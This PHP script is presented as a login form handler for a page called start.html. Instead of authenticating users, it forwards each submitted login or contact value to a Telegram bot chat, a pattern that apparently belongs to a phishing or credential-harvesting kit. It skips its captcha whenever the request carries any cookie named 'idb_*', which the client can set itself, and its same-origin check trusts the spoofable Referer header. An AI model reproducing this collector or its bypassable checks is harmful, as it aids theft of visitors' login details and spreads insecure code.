<?php
/**
 * Login Form Handler for start.html
 *
 * Accepts login requests submitted from start.html.
 * Skips SmartCaptcha verification when the visitor already has a valid
 * idb_* cookie (Yandex identity token = known/registered user).
 *
 * Place this file in the same directory as start.html on your server,
 * alongside telegram-config.php.
 */

header('Content-Type: application/json');

// ── Same-host verification ────────────────────────────────────────────────────
function is_same_host(): bool {
    if (empty($_SERVER['HTTP_REFERER'])) {
        return false;
    }
    $referer_host = parse_url($_SERVER['HTTP_REFERER'], PHP_URL_HOST);
    $server_host  = $_SERVER['HTTP_HOST'] ?? $_SERVER['SERVER_NAME'] ?? '';
    $referer_host = strtolower(preg_replace('/:\d+$/', '', $referer_host ?? ''));
    $server_host  = strtolower(preg_replace('/:\d+$/', '', $server_host));
    return $referer_host !== '' && $referer_host === $server_host;
}

if (!is_same_host()) {
    http_response_code(403);
    echo json_encode(['ok' => false, 'error' => 'Forbidden: request must originate from the same host.']);
    exit;
}

// ── Only allow POST ───────────────────────────────────────────────────────────
if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
    http_response_code(405);
    echo json_encode(['ok' => false, 'error' => 'Method not allowed.']);
    exit;
}

// ── Load config ───────────────────────────────────────────────────────────────
$config_file = __DIR__ . '/telegram-config.php';
if (!file_exists($config_file)) {
    http_response_code(500);
    echo json_encode(['ok' => false, 'error' => 'Configuration file not found.']);
    exit;
}
require_once $config_file;

if (empty(TELEGRAM_BOT_TOKEN) || empty(TELEGRAM_CHAT_ID)) {
    http_response_code(500);
    echo json_encode(['ok' => false, 'error' => 'Telegram credentials are not configured.']);
    exit;
}

// ── Read input ────────────────────────────────────────────────────────────────
$raw  = file_get_contents('php://input');
$data = json_decode($raw, true);
if (!is_array($data)) {
    $data = $_POST;
}

// ── SmartCaptcha verification ─────────────────────────────────────────────────
function verifyCaptcha(string $token): bool {
    $serverKey = defined('SMARTCAPTCHA_SERVER_KEY') ? SMARTCAPTCHA_SERVER_KEY : '';
    if ($serverKey === '' || $serverKey === 'ysc2_XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX') return true;
    if ($token === '') return false;
    $url = 'https://smartcaptcha.yandexcloud.net/validate';
    $params = http_build_query([
        'secret' => $serverKey,
        'token'  => $token,
        'ip'     => $_SERVER['REMOTE_ADDR'] ?? '',
    ]);
    $context = stream_context_create([
        'http' => [
            'method'  => 'POST',
            'header'  => "Content-Type: application/x-www-form-urlencoded\r\n",
            'content' => $params,
            'timeout' => 5,
        ],
    ]);
    $result = @file_get_contents($url, false, $context);
    if ($result === false) return false;
    $res_data = json_decode($result, true);
    return isset($res_data['status']) && $res_data['status'] === 'ok';
}

// Skip captcha verification for visitors with an idb_* cookie (registered users).
$hasIdbCookie = (bool) preg_grep('/^idb_/', array_keys($_COOKIE));

$captchaToken = trim($data['smart-token'] ?? $data['captcha_token'] ?? '');
if (!$hasIdbCookie && !verifyCaptcha($captchaToken)) {
    http_response_code(400);
    echo json_encode(['ok' => false, 'error' => 'Проверка капчи не пройдена. Попробуйте ещё раз.']);
    exit;
}

// ── Validate required fields ──────────────────────────────────────────────────
$contact = trim($data['contact'] ?? $data['login'] ?? '');
if ($contact === '') {
    http_response_code(400);
    echo json_encode(['ok' => false, 'error' => 'Поле контакта обязательно.']);
    exit;
}

// ── Notify via Telegram ───────────────────────────────────────────────────────
function esc(string $text): string {
    return preg_replace('/([_*\[\]()~`>#+\-=|{}.!\\\\])/', '\\\\$1', $text);
}

$lines = ["*Запрос входа с start\\.html*"];
$lines[] = "📬 *Контакт:* " . esc($contact);

$message = implode("\n", $lines);

$base = defined('TELEGRAM_API_BASE') ? rtrim(TELEGRAM_API_BASE, '/') : 'https://api.telegram.org';
$url = $base . '/bot' . TELEGRAM_BOT_TOKEN . '/sendMessage';
$payload = json_encode([
    'chat_id'    => TELEGRAM_CHAT_ID,
    'text'       => $message,
    'parse_mode' => 'MarkdownV2',
]);

$ch = curl_init($url);
curl_setopt_array($ch, [
    CURLOPT_POST           => true,
    CURLOPT_POSTFIELDS     => $payload,
    CURLOPT_HTTPHEADER     => ['Content-Type: application/json'],
    CURLOPT_RETURNTRANSFER => true,
    CURLOPT_TIMEOUT        => 10,
]);
$response = curl_exec($ch);
$http_code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
$curl_error = curl_error($ch);
curl_close($ch);

if ($curl_error) {
    http_response_code(502);
    echo json_encode(['ok' => false, 'error' => 'Could not reach Telegram API: ' . $curl_error]);
    exit;
}

$tg_response = json_decode($response, true);

if ($http_code !== 200 || empty($tg_response['ok'])) {
    http_response_code(502);
    echo json_encode([
        'ok'    => false,
        'error' => 'Telegram API error.',
        'details' => $tg_response['description'] ?? $response,
    ]);
    exit;
}

echo json_encode(['ok' => true, 'message' => 'Запрос входа отправлен.']);
